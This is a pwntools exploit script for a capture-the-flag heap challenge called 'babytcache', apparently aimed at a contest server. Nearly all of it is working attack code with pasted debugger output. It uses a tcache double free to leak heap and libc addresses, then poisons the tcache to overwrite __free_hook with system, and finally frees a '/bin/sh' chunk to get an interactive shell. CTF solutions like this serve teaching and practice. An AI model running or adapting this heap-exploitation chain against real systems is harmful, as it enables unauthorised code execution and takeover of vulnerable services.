#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.terminal=["tmux", "sp", "-h"]
context.log_level = "debug"

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #same as remote server
elf = ELF("./babytcache")


RHOST = "51.158.118.84"
RPORT = 17002
LHOST = "127.0.0.1"
LPORT = 31337

p = None
choose = sys.argv.pop(1) if len(sys.argv) > 1 else '?'
if choose in 'remote':
    p = remote(*{'remote': (RHOST, RPORT)}[choose])

if choose in 'local':
	p = remote(*{'local': (LHOST, LPORT)}[choose])

elif choose == 'debug':
    gdbscript = """
    c
    """
    p = gdb.debug(['./babytcache'], gdbscript=gdbscript)
else:
    #p = process(['./babytcache'])
    p = process(['./babytcache'], env={'LD_PRELOAD': 'libc.so.6'})
    if choose == 'attach': gdb.attach(p)

def add(idx, sz, data):
	p.sendlineafter(">","1")
	p.sendlineafter(":",str(idx))
	p.sendlineafter(":",str(sz))
	p.sendlineafter(":",data)

def edit(idx,data):
	p.sendlineafter(">","2")
	p.sendlineafter(":",str(idx))
	p.sendlineafter(":",data)

def free(idx):
	p.sendlineafter(">","3")
	p.sendlineafter(":",str(idx))

def show(idx):
	p.sendlineafter(">","4")
	p.sendlineafter(":",str(idx))

add(0,0x200,'A'*0x80)
add(1,0x20,"B"*0x80)
add(2,0x20b,'C'*0x80)

free(0)
free(0)

'''
					|----> heap leak
0x555555757260: 0x0000555555757260      0x4141414141414141
0x555555757270: 0x4141414141414141      0x4141414141414141
0x555555757280: 0x4141414141414141      0x4141414141414141
0x555555757290: 0x4141414141414141      0x4141414141414141
0x5555557572a0: 0x4141414141414141      0x4141414141414141
0x5555557572b0: 0x4141414141414141      0x4141414141414141
'''

show(0)
p.recvuntil("Your Note :")
heap_leak = u64(p.recvline().rstrip().ljust(8,"\x00"))
log.info("heap_leak : "+hex(heap_leak))

heap_base = heap_leak - 0x260 + 0x10
log.info("heap_base : "+hex(heap_base))
'''
pwndbg> xinfo 0x0000555555757260
Extended information for virtual address 0x555555757260:

  Containing mapping:
    0x555555757000     0x555555778000 rw-p    21000 0      [heap]

  Offset information:
         Mapped Area 0x555555757260 = 0x555555757000 + 0x260
pwndbg>
'''
edit(0,p64(heap_base))
'''
pwndbg> bins
tcachebins
0x90 [  2]: 0x555555757260 —▸ 0x555555757010 ◂— 0x200000000000000
'''

add(3,0x200,"A"*8)
add(4, 0x200, p64(0xdeadbeef)+p64(0xdeadbeef)+p64(0xdeadbeef) + p64(0x0700000000000000) * 36 )
free(0)
show(0)

p.recvuntil("Your Note :")
libc_base = u64(p.recvline().rstrip().ljust(8,"\x00")) - 0x3ebca0
log.info("libc_base : "+hex(libc_base))

'''
    00000000  59 6f 75 72  20 4e 6f 74  65 20 3a a0  fc dc f7 ff  │Your│ Not│e :·│····│
    00000010  7f 0a 0a 31  29 20 41 64  64 20 6e 6f  74 65 0a 32  │···1│) Ad│d no│te·2│
    00000020  29 20 45 64  69 74 20 6e  6f 74 65 0a  33 29 20 46  │) Ed│it n│ote·│3) F│
    00000030  72 65 65 20  6e 6f 74 65  0a 34 29 20  56 69 65 77  │ree │note│·4) │View│
    00000040  20 6e 6f 74  65 0a 35 29  20 45 78 69  74 0a 3e 3e  │ not│e·5)│ Exi│t·>>│
    00000050  20                                                  │ │
    00000051
[*] libc_base : 0x7ffff79e4000
[*] Switching to interactive mode
'''
one_gadget = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']

edit(4, p64(0xdeadbeef) * 8 + p64(one_gadget))
add(5, 0x18, p64(system))

edit(0,'/bin/sh\x00')
free(0)


p.interactive()

